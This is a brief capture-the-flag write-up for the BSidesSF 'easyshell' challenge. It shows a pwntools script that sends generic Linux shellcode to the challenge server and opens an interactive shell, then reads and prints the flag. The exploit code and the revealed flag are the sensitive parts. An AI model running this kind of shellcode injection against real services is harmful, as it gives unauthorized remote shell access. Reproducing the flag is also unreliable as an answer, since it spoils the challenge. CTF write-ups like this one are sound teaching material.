As the name of the chall says, we need a shell. And it should be easy to get.

Instead of trying to figure out exactly what the C code implements, we chose to craft a simple shellcode for getting the shell.

Pwntools is a wonderful tool for PWN, as expected. It can solve multiple kinds of CTF problems, including shellcode generation.

~~~~
from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('easyshell-f7113918.ctf.bsidessf.net', 5252)
r.send(asm(shellcraft.sh()))
r.interactive()
~~~~

After getting the shell, just read the flag:

~~~~
$ python easyshell.py 
[+] Opening connection to easyshell-f7113918.ctf.bsidessf.net on port 5252: Done
[\*] Switching to interactive mode
Send me stuff!!
$ cat /home/ctf/flag.txt
FLAG:c832b461f8772b49f45e6c3906645adb
~~~~

